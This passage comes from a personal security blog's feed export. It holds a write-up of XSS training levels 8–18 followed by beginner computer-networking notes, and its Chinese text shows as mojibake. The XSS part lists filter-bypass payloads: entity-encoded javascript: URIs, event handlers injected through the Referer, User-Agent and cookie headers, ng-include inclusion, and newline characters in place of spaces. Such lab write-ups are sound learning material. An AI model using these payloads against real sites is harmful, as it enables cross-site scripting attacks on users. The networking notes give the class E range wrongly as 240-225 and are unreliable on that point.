ä¹æ‰¾ä¸åˆ°</p><p>ä½†ä¸‹é¢é“¾æ¥å¤„å¯ä»¥çœ‹åˆ° &lt;&gt; â€˜ % # &amp; æœªè¢«è¿‡æ»¤ çœ‹äº†åˆ«äººé¢˜è§£ä¹‹åæ˜¯<strong>htmlå®ä½“ç¼–ç ç»•è¿‡</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)</span><br><span class="line">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>ä¸äº†è§£ï¼Œå»çœ‹äº†æºç æ˜¯<strong>å¾—åŠ http://</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>è¿™çœŸæƒ³ä¸å‡ºæ¥</p><p>è¯•äº†ä¸‰ä¸ªå‚æ•°ï¼Œå‘ç°åªæœ‰æœ€åä¸€ä¸ªå¯ä»¥å†™å…¥ï¼Œ<strong>ç›´æ¥æ„é€ </strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; type&#x3D;text onmouseover&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; type&#x3D;image src&#x3D;1 onerror&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>è¿™ä¸ªé¢˜åº”è¯¥æ˜¯æŠ“åŒ…çœ‹ï¼Œä½†ç”±äºæˆ‘æ˜¯è°·æ­Œåšé¢˜ï¼Œç«ç‹æŠ“åŒ…ï¼Œå¯¼è‡´æ¯æ¬¡ç›´æ¥å¤åˆ¶11é¢˜urlå®ƒéƒ½ä¸ä¼šç›´æ¥æŠ“åˆ°refå¤´ï¼Œæ­£ç¡®åº”è¯¥æ˜¯åœ¨10é¢˜å‘11é¢˜è·³è½¬æ—¶æŠ“åŒ…ã€‚</p><p><img src="/2020/12/09/xss/image-20200822205648946.png" alt="image-20200822205648946"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover&#x3D;alert(1) type&#x3D;&#39;text&#39;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>æŠŠrefå¤´æ”¹æˆè¿™ä¸ªï¼Œå‘åŒ…å³å¯</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>æœ‰äº†ä¸Šä¸€ä¸ªé¢˜çš„æç¤ºï¼Œè¿™ä¸ªé¢˜å°±æ˜æ˜¾å¾ˆå¤šäº†</p><p>åªè¦æ”¹ä¸€ä¸‹UAå¤´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>è¿™ä¸ªåº”è¯¥æ˜¯æ”¹cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__cfduid&#x3D;d0d48515569060ded9a058127e163bb661598095904;user&#x3D;&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>é“¾æ¥å¥½åƒæ˜¯æŒ‚æ‰äº†ï¼Œä½†å¥½åƒæ˜¯æ²¡æœ‰å¤ªçœ‹æ‡‚ï¼Œå›å¤´å†æ¥çœ‹ä¸€ä¸‹</p><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>çœ‹æºç å‘ç°</p><p><img src="/2020/12/09/xss/image-20200822213204305.png" alt="image-20200822213204305"></p><p>ç„¶åä¸Šç½‘æŸ¥ä¸€ä¸‹</p><p><strong>ng-include</strong> æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚</p><p>åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚</p><p><code>ng-include</code> å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨<strong>åŒä¸€ä¸ªåŸŸå</strong>ä¸‹ã€‚</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src&#x3D;&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´srcåŒ…å«çš„å†…å®¹ä¼šè¿›å…¥ng-includeè¢«åŒ…å«</p><p>é‚£æˆ‘ä»¬å¯ä»¥æƒ³å‡ºèƒ½ä¸èƒ½ç›´æ¥é—­åˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src&#x3D;&quot;&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><p>ä½†å‘ç°ç›´æ¥è¢«è½¬ä¹‰äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸è¡Œï¼Œåªèƒ½åŒ…å«ç¬¬ä¸€å…³ä»£ç </p><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>è¿™ä¸ªé¢˜æ˜¯æŠŠç©ºæ ¼è¿‡æ»¤äº†</p><p>ç”¨%0då’Œ%0aç»•è¿‡</p><p><strong>%0aæ¢è¡Œç¬¦å·â€\nâ€<br>%0då›è½¦ç¬¦å·â€\râ€</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0Dsrc&#x3D;1%0Donerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>å°±æ‰¾æºç å’Œurlä¹‹é—´çš„å…³ç³»</p><p>å¯ä»¥çœ‹è§åœ¨srcå¤„æœ‰ä¸åŒ</p><p>&lt;&gt;è¢«è¿‡æ»¤ï¼Œè€ƒè™‘onäº‹ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg02&#x3D; onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>å’Œ17å…³ä¸€æ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01&#x3D;a%20&amp;arg02&#x3D;b onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- åå¼•å·ä»£æ›¿åœ†æ‹¬å·</span><br><span class="line">- æ¢è¡Œç»•è¿‡æ­£åˆ™</span><br><span class="line">- &lt;!--ä¸ä»…å¯ä»¥ç”¨--&gt;,ä¹Ÿå¯ä»¥ç”¨--!&gt;é—­åˆ</span><br><span class="line">- &#x2F;&#x2F;å¯ä»¥ç”¨æ¢è¡Œæ¥ç»•è¿‡</span><br><span class="line">- &lt;!--å’Œ--&gt;éƒ½å¯ä»¥åœ¨htmlçš„scriptæ ‡ç­¾é‡Œå•ç‹¬ä½¿ç”¨è¿›è¡Œå•è¡Œæ³¨é‡Š</span><br><span class="line">- Å¿ ç¬¦å·è½¬æ¢ä¸ºå¤§å†™åæ­£å¥½ä¸ºå¤§å†™å­—æ¯ S</span><br><span class="line">- å¯ä»¥ç”¨ %0a ä»£æ›¿ç©ºæ ¼è¿›è¡Œç»•è¿‡</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™ç¯‡æ›´ä¹±ï¼Œä¹Ÿå°±é‚£ä¸ªå°æŒ‘æˆ˜è¿˜ç®—å®Œæ•´&lt;/p&gt;
&lt;h1 id=&quot;XSS&quot;&gt;&lt;a href=&quot;#XSS&quot; class=&quot;headerlink&quot; title=&quot;XSS&quot;&gt;&lt;/a&gt;XSS&lt;/h1&gt;&lt;h2 id=&quot;åŸºç¡€çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#åŸºç¡€çŸ¥è¯†&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
    <category term="xss" scheme="https://pz1o.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>è®¡ç½‘</title>
    <link href="https://pz1o.top/2020/12/09/%E8%AE%A1%E7%BD%91/"/>
    <id>https://pz1o.top/2020/12/09/%E8%AE%A1%E7%BD%91/</id>
    <published>2020-12-09T15:29:40.000Z</published>
    <updated>2020-12-09T15:32:12.091Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸ªåªæœ‰è¿™ä¸€éƒ¨åˆ†äº†</p><p>åé¢å­¦äº†ä½†å¥½åƒä¸¢äº†</p><p>çœ‹å¤šä¼šå­¦åˆ°è®¡ç½‘æ—¶ï¼Œå†æ¥è¡¥è¿™ä¸€ç¯‡</p><h1 id="è®¡ç½‘åˆå­¦"><a href="#è®¡ç½‘åˆå­¦" class="headerlink" title="è®¡ç½‘åˆå­¦"></a>è®¡ç½‘åˆå­¦</h1><h2 id="TCP-IPåˆ†å±‚æ¨¡å‹"><a href="#TCP-IPåˆ†å±‚æ¨¡å‹" class="headerlink" title="TCP/IPåˆ†å±‚æ¨¡å‹"></a><strong>TCP/IPåˆ†å±‚æ¨¡å‹</strong></h2><div class="table-container"><table><thead><tr><th>åº”ç”¨å±‚ï¼ˆç¬¬äº”å±‚)</th></tr></thead><tbody><tr><td><strong>ä¼ è¾“å±‚ï¼ˆç¬¬å››å±‚ï¼‰</strong></td></tr><tr><td><strong>äº’è”ç½‘å±‚ï¼ˆç¬¬ä¸‰å±‚ï¼‰</strong></td></tr><tr><td><strong>ç½‘è·¯æ¥å£å±‚ï¼ˆç¬¬äºŒå±‚ï¼‰</strong></td></tr><tr><td><strong>ç‰©ç†å±‚ï¼ˆç¬¬ä¸€å±‚ï¼‰</strong></td></tr></tbody></table></div><p>ç‰©ç†å±‚ï¼šå¯¹åº”äºç½‘ç»œçš„åŸºæœ¬ç¡¬ä»¶ï¼Œå³æˆ‘ä»¬å¯ä»¥çœ‹å¾—è§çš„ç¡¬ä»¶è®¾å¤‡ã€‚</p><p>ç½‘ç»œæ¥å£å±‚ï¼šå®šä¹‰äº†å°†æ•°æ®ç»„æˆæ­£ç¡®å¸§çš„è§„ç¨‹å’Œåœ¨ç½‘ç»œä¸­ä¼ è¾“å¸§çš„è§„ç¨‹ã€‚</p><p>äº’è”ç½‘å±‚ï¼šæœ¬å±‚å®šä¹‰äº†äº’è”ç½‘ä¸­ä¼ è¾“çš„ä¿¡æ¯åŒ…çš„æ ¼å¼ï¼Œä»¥åŠä»ä¸€ä¸ªç”¨æˆ·é€šè¿‡ä¸€ä¸ªæˆ–å¤šä¸ªè·¯ç”±å™¨åˆ°æœ€ç»ˆç›®æ ‡çš„ä¿¡æ¯åŒ…è½¬å‘æœºåˆ¶ã€‚</p><p>ä¼ è¾“å±‚ï¼šä¸ºä¸¤ä¸ªç”¨æˆ·è¿›ç¨‹ä¹‹é—´å»ºç«‹ï¼Œç®¡ç†å’Œæ‹†é™¤å¯é è€Œåˆæœ‰æ•ˆçš„ç«¯åˆ°ç«¯çš„è¿æ¥ã€‚</p><p>åº”ç”¨å±‚ï¼šå®šä¹‰äº†åº”ç”¨ç¨‹åºä½¿ç”¨äº’è”ç½‘çš„è§„ç¨‹ã€‚</p><h2 id="IPåœ°å€"><a href="#IPåœ°å€" class="headerlink" title="IPåœ°å€"></a>IPåœ°å€</h2><p>ipåœ°å€åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šç½‘ç»œæ ‡è¯†å’Œä¸»æœºæ ‡è¯†</p><p>ç½‘ç»œæ ‡è¯†ï¼šç”¨ä»¥æ ‡æ˜å…·ä½“çš„ç½‘ç»œæ®µ</p><p>ä¸»æœºæ ‡è¯†ï¼šæŸä¸ªç½‘ç»œä¸­å¾…å®šçš„è®¡ç®—æœºå·ç </p><p>ç½‘ç»œæ ‡è¯†ï¼š210.73.140.0</p><p>ä¸»æœºæ ‡è¯†ï¼š                    2</p><p>åˆèµ·æ¥å†™ï¼š210.73.140.2</p><p>äººä»¬æŒ‰ç…§ç½‘ç»œè§„æ¨¡çš„å¤§å°ï¼ŒæŠŠ32ä¸ºåœ°å€ä¿¡æ¯è®¾æˆ3ç§å®šä½çš„åˆ’åˆ†æ–¹å¼ï¼Œä¸‰ç§åˆ’åˆ†æ–¹æ³•åˆ†åˆ«å¯¹åº”äºAï¼ŒBï¼ŒCç±»IPåœ°å€ï¼ŒIPåœ°å€åˆ†ä¸ºç½‘ç»œå·å’Œä¸»æœºå·ä¸¤éƒ¨åˆ†</p><p>ï¼ˆ1ï¼‰Aç±»IPåœ°å€ï¼ˆ1-126ï¼‰</p><p>è¯¥åœ°å€ç”±1å­—èŠ‚ç½‘ç»œåœ°å€å’Œ3å­—èŠ‚ä¸»æœºåœ°å€ç»„æˆï¼Œç½‘ç»œåœ°å€æœ€é«˜ä½å¿…é¡»æ˜¯0ã€‚</p><p>ï¼ˆ2ï¼‰Bç±»IPåœ°å€ï¼ˆ128-191ï¼‰</p><p>è¯¥åœ°å€ç”±2å­—èŠ‚ç½‘ç»œåœ°å€å’Œ2å­—èŠ‚ä¸»æœºåœ°å€ç»„æˆï¼Œç½‘ç»œåœ°å€æœ€é«˜ä½å¿…é¡»æ˜¯10ã€‚</p><p>ï¼ˆ3ï¼‰Cç±»IPåœ°å€ï¼ˆ192-223ï¼‰</p><p>è¯¥åœ°å€ç”±3å­—èŠ‚ç½‘ç»œåœ°å€å’Œ1å­—èŠ‚ä¸»æœºåœ°å€ç»„æˆï¼Œç½‘ç»œåœ°å€æœ€é«˜ä½å¿…é¡»æ˜¯110ã€‚</p><p>ï¼ˆ4ï¼‰Dç±»IPåœ°å€ï¼ˆ224-239ï¼‰</p><p>å¤šç‚¹å¹¿æ’­åœ°å€ï¼Œç”¨äºIPç»„æ’­ã€‚</p><p>ï¼ˆ5ï¼‰Eç±»IPåœ°å€ï¼ˆ240-225ï¼‰</p><p>ä¿ç•™åœ°å€ï¼Œç”¨ä½œç‰¹æ®Šç”¨é€”ã€‚</p><p>ï¼ˆ0.0.0.0ï¼‰å¯¹åº”å½“å‰ä¸»æœºï¼Œï¼ˆ255.255.255.255ï¼‰æ˜¯å½“å‰å­ç½‘çš„ä¼ æ’­åœ°å€ã€‚</p><h2 id="åŸŸå"><a href="#åŸŸå" class="headerlink" title="åŸŸå"></a>åŸŸå</h2><p>é¡¶çº§åŸŸå .com</p><p>äºŒçº§åŸŸå test.com</p><p>ä¸‰çº§åŸŸå test.cn.com</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609213455144.png" alt="image-20200609213455144"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214339970.png" alt="image-20200609214339970"></p><h2 id="DNSæœåŠ¡å™¨"><a href="#DNSæœåŠ¡å™¨" class="headerlink" title="DNSæœåŠ¡å™¨"></a>DNSæœåŠ¡å™¨</h2><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214938548.png" alt="image-20200609214938548"></p><h1 id="è®¡ç½‘å­¦ä¹ "><a href="#è®¡ç½‘å­¦ä¹ " class="headerlink" title="è®¡ç½‘å­¦ä¹ "></a>è®¡ç½‘å­¦ä¹ </h1><h2 id="ç¬¬ä¸€ç« -è®¡ç®—æœºç½‘ç»œæ¦‚è¿°"><a href="#ç¬¬ä¸€ç« -è®¡ç®—æœºç½‘ç»œæ¦‚è¿°" class="headerlink" title="ç¬¬ä¸€ç«  è®¡ç®—æœºç½‘ç»œæ¦‚è¿°"></a>ç¬¬ä¸€ç«  è®¡ç®—æœºç½‘ç»œæ¦‚è¿°</h2><p>å±€åŸŸç½‘ï¼šè¦†ç›–èŒƒå›´å°  è‡ªå·±èŠ±é’±ä¹°è®¾å¤‡  å¸¦å®½å›ºå®š</p><p>å¹¿åŸŸç½‘ï¼šè·ç¦»è¿œ èŠ±é’±ä¹°æœåŠ¡</p><p>Internet ï¼šæœ‰è‡ªå·±çš„æœºæˆ¿  å¯¹ç½‘æ°‘æä¾›è¿æ¥ã€‚</p><p>IPåœ°å€ï¼šç½‘ç»œä¸­çš„åœ°å€ã€‚</p><p>ç‰©ç†åœ°å€ï¼šMacåœ°å€ï¼Œç”µè„‘å‡ºå‚æ—¶å·²å›ºå®šã€‚</p><p>ç½‘å…³ï¼šä¸‹å›¾ä¸­çš„Gå°±æ˜¯ç½‘å…³ï¼Œç›¸å½“äºç½‘ç»œä¸­çš„ä¸€ä¸ªå…³å¡ã€‚ç½‘å…³åœ°å€ä¸ºGçš„IPåœ°å€ã€‚</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609224145835.png" alt="image-20200609224145835"></p><div class="table-container"><table><thead><tr><th>æœ¬æœºip</th><th>è®¿é—®ip</th><th>æœ¬æœºmac</th><th>ä¸‹æ¬¡è®¿é—®mac</th></tr></thead><tbody><tr><td>15.0.0.2</td><td>13.0.0.2</td><td>m4</td><td>m5</td></tr></tbody></table></div><p><strong>OSIå‚è€ƒæ¨¡å‹</strong></p><ul><li>åº”ç”¨å±‚ï¼šèƒ½äº§ç”Ÿç½‘ç»œæµé‡çš„ç¨‹åº</li><li>è¡¨ç¤ºå±‚ï¼šåœ¨ä¼ è¾“ä¹‹å‰æ˜¯å¦åŠ å¯†æˆ–å‹ç¼©å¤„ç†</li><li>ä¼šè¯å±‚ï¼šæŸ¥æ­£åœ¨è¿›è¡Œä¼šè¯çš„ç¨‹åº netstat -nb</li><li>ä¼ è¾“å±‚ï¼šå¯é ä¼ è¾“ï¼ˆTCPï¼‰å’Œæµé‡æ§åˆ¶ ä¸å¯é ä¼ è¾“ï¼ˆUDPï¼‰</li><li>ç½‘ç»œå±‚ï¼šé€‰æ‹©æœ€ä½³è·¯å¾„ è§„åˆ’IPåœ°å€</li><li>æ•°æ®é“¾è·¯å±‚ï¼šå¸§çš„å¼€å§‹å’Œç»“æŸã€‚å·®é”™æ£€æŸ¥ã€‚</li><li>ç‰©ç†å±‚ï¼šæ¥å£æ ‡å‡†å’Œç”µå™¨æ ‡å‡†</li></ul><p><strong>OSIå‚è€ƒæ¨¡å‹ç½‘ç»œæ’é”™æŒ‡å¯¼</strong></p><ol><li>ç‰©ç†å±‚æ•…éšœï¼šæŸ¥çœ‹è¿æ¥çŠ¶æ€ï¼Œå‘é€å’Œæ¥å—çš„æ•°æ®åŒ…</li><li>æ•°æ®é“¾è·¯å±‚ï¼šMACåœ°å€å†²çªã€ç½‘é€Ÿåå•†ä¸ä¸€è‡´ã€è®¡ç®—æœºVLANé”™è¯¯</li><li>ç½‘ç»œå±‚æ•…éšœï¼šé…ç½®é”™è¯¯çš„IPåœ°å€ å­ç½‘æ©ç å’Œé”™è¯¯çš„ç½‘å…³</li><li>åº”ç”¨å±‚æ•…éšœï¼šåº”ç”¨é”™è¯¯ä»£ç†ã€‚</li></ol><p>æ£€æŸ¥ç½‘ç»œæ˜¯å¦é€šç•…ï¼špingä¸€ä¸ªç½‘å€</p><p><strong>OSIå‚è€ƒæ¨¡å‹å’Œç½‘ç»œå®‰å…¨</strong></p><ol><li>ç‰©ç†å±‚å®‰å…¨</li><li>æ•°æ®é“¾è·¯å±‚å®‰å…¨ï¼šç™»å½•éœ€è¦è´¦å·å’Œå¯†ç </li><li>ç½‘ç»œå±‚å®‰å…¨ï¼šè·¯ç”±å™¨é™åˆ¶æ•°æ®åŒ…æµé‡</li><li>åº”ç”¨å±‚å®‰å…¨ï¼šå¼€å‘ç¨‹åºæœ‰æ²¡æœ‰æ¼æ´<img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122326325.png" alt="image-20200610122326325"></li></ol><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122957433.png" alt="image-20200610122957433"></p><h2 id="ç¬¬äºŒç« -ç‰©ç†å±‚"><a href="#ç¬¬äºŒç« -ç‰©ç†å±‚" class="headerlink" title="ç¬¬äºŒç«  ç‰©ç†å±‚"></a>ç¬¬äºŒç«  ç‰©ç†å±‚</h2><h3 id="0x01ç‰©ç†å±‚çš„åŸºæœ¬æ¦‚å¿µ"><a href="#0x01ç‰©ç†å±‚çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="0x01ç‰©ç†å±‚çš„åŸºæœ¬æ¦‚å¿µ"></a>0x01ç‰©ç†å±‚çš„åŸºæœ¬æ¦‚å¿µ</h3><p>ç‰©ç†å±‚è§£å†³å¦‚ä½•è¿æ¥åœ¨å„ç§è®¡ç®—æœºçš„<strong>ä¼ è¾“åª’ä½“ä¸Š</strong>ä¼ è¾“<strong>æ•°æ®æ¯”ç‰¹æµ</strong>ï¼Œä¸æ˜¯æŒ‡å…·ä½“çš„ä¼ è¾“åª’ä½“ã€‚</p><p>ç‰©ç†å±‚ä¸»è¦æ˜¯ç¡®å®šä¼ è¾“åª’ä½“çš„æ¥å£çš„ä¸€äº›ç‰¹æ€§ã€‚æœ‰æœºæ¢°ï¼Œç”µå™¨ï¼ŒåŠŸèƒ½ï¼Œè¿‡ç¨‹ç‰¹æ€§ã€‚</p><h3 id="0x02æ•°æ®é€šä¿¡çŸ¥è¯†"><a href="#0x02æ•°æ®é€šä¿¡çŸ¥è¯†" class="headerlink" title="0x02æ•°æ®é€šä¿¡çŸ¥è¯†"></a>0x02æ•°æ®é€šä¿¡çŸ¥è¯†</h3><p><strong>æ•°æ®é€šä¿¡æ¨¡å‹</strong>ï¼š</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611101252348.png" alt="image-20200611101252348"></p><p>æ•°æ®ï¼šè¿é€æ¶ˆæ¯çš„å®ä½“ã€‚</p><p>ä¿¡å·ï¼šæ•°æ®ç”µæ°”æˆ–ç”µç£çš„è¡¨ç°ã€‚</p><p>ä¿¡é“ï¼šè¡¨ç¤ºä¸€ä¸ªæ–¹å‘ä¼ é€ä¿¡æ¯çš„åª’ä½“ã€‚</p><p>å•å‘é€šä¿¡ï¼ŒåŒå‘äº¤æ›¿é€šä¿¡ï¼ŒåŒå‘åŒæ—¶é€šä¿¡ã€‚</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611103259080.png" alt="image-20200611103259080"></p><h3 id="0x03ç‰©ç†å±‚ä¸‹é¢çš„ä¼ è¾“åª’ä½“"><a href="#0x03ç‰©ç†å±‚ä¸‹é¢çš„ä¼ è¾“åª’ä½“" class="headerlink" title="0x03ç‰©ç†å±‚ä¸‹é¢çš„ä¼ è¾“åª’ä½“"></a>0x03ç‰©ç†å±‚ä¸‹é¢çš„ä¼ è¾“åª’ä½“</h3><p>æ— å±è”½åŒç»çº¿UTP</p><p>å±è”½åŒç»çº¿STP</p><p>åŒè½´ç”µç¼†</p><p>å…‰çº¤</p><p>å¾®æ³¢ä¼ è¾“</p><p>ç‰©ç†å±‚è®¾å¤‡â€”é›†çº¿å™¨</p><h3 id="0x04ä¿¡é“å¤ç”¨æŠ€æœ¯"><a href="#0x04ä¿¡é“å¤ç”¨æŠ€æœ¯" class="headerlink" title="0x04ä¿¡é“å¤ç”¨æŠ€æœ¯"></a>0x04ä¿¡é“å¤ç”¨æŠ€æœ¯</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611121924344.png" alt="image-20200611121924344"></p><h3 id="0x05æ•°å­—ä¼ è¾“ç³»ç»Ÿ"><a href="#0x05æ•°å­—ä¼ è¾“ç³»ç»Ÿ" class="headerlink" title="0x05æ•°å­—ä¼ è¾“ç³»ç»Ÿ"></a>0x05æ•°å­—ä¼ è¾“ç³»ç»Ÿ</h3><h3 id="0x06å®½å¸¦æ¥å…¥æŠ€æœ¯"><a href="#0x06å®½å¸¦æ¥å…¥æŠ€æœ¯" class="headerlink" title="0x06å®½å¸¦æ¥å…¥æŠ€æœ¯"></a>0x06å®½å¸¦æ¥å…¥æŠ€æœ¯</h3><p>ADSL</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611122852820.png" alt="image-20200611122852820"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123214486.png" alt="image-20200611123214486"></p><p>å…‰çº¤</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123435591.png" alt="image-20200611123435591"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123546821.png" alt="image-20200611123546821"></p><h2 id="ç¬¬ä¸‰ç« æ•°æ®é“¾è·¯å±‚"><a href="#ç¬¬ä¸‰ç« æ•°æ®é“¾è·¯å±‚" class="headerlink" title="ç¬¬ä¸‰ç« æ•°æ®é“¾è·¯å±‚"></a>ç¬¬ä¸‰ç« æ•°æ®é“¾è·¯å±‚</h2><h3 id="0x01æ•°æ®é“¾è·¯å±‚åŸºæœ¬æ¦‚å¿µ"><a href="#0x01æ•°æ®é“¾è·¯å±‚åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="0x01æ•°æ®é“¾è·¯å±‚åŸºæœ¬æ¦‚å¿µ"></a>0x01æ•°æ®é“¾è·¯å±‚åŸºæœ¬æ¦‚å¿µ</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615185534103.png" alt="image-20200615185534103"></p><p>æ•°æ®é“¾è·¯å±‚ä¿¡é“ç±»å‹ï¼šç‚¹åˆ°ç‚¹å’Œå¹¿æ’­ã€‚</p><p>é“¾è·¯ï¼šæ˜¯ä¸€æ¡ç‚¹åˆ°ç‚¹çš„ç‰©ç†çº¿è·¯æ®µã€‚</p><p>æ•°æ®é“¾è·¯ï¼šé™¤äº†ç‰©ç†çº¿è·¯å¤–ï¼Œè¿˜å¿…é¡»æœ‰é€šä¿¡åè®®æ¥æ§åˆ¶è¿™äº›æ•°æ®çš„ä¼ è¾“ã€‚</p><p>å¸§ï¼šå¸§å¤´ å¸§å°¾ macåœ°å€ æ ¡éªŒç </p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615190949900.png" alt="image-20200615190949900"></p><h3 id="0x02æ•°æ®é“¾è·¯å±‚çš„ä¸‰ä¸ªåŸºæœ¬é—®é¢˜"><a href="#0x02æ•°æ®é“¾è·¯å±‚çš„ä¸‰ä¸ªåŸºæœ¬é—®é¢˜" class="headerlink" title="0x02æ•°æ®é“¾è·¯å±‚çš„ä¸‰ä¸ªåŸºæœ¬é—®é¢˜"></a>0x02æ•°æ®é“¾è·¯å±‚çš„ä¸‰ä¸ªåŸºæœ¬é—®é¢˜</h3><p>1.å°è£…æˆå¸§</p><p>2.é€æ˜ä¼ è¾“ï¼ˆå°†è½¬ä¹‰å­—ç¬¦è½¬ä¹‰ï¼‰</p><p>3.å·®é”™æ§åˆ¶</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615194723467.png" alt="image-20200615194723467"></p><p>ä¼ çš„æ•°æ®ä¸º<strong>101001001</strong>/1101ä½™æ•°ä¸º0å°±ä¼šæ¥å—ã€‚</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195101214.png" alt="image-20200615195101214"></p><h3 id="0x03ä¸¤ç§æƒ…å†µä¸‹çš„æ•°æ®é“¾è·¯å±‚"><a href="#0x03ä¸¤ç§æƒ…å†µä¸‹çš„æ•°æ®é“¾è·¯å±‚" class="headerlink" 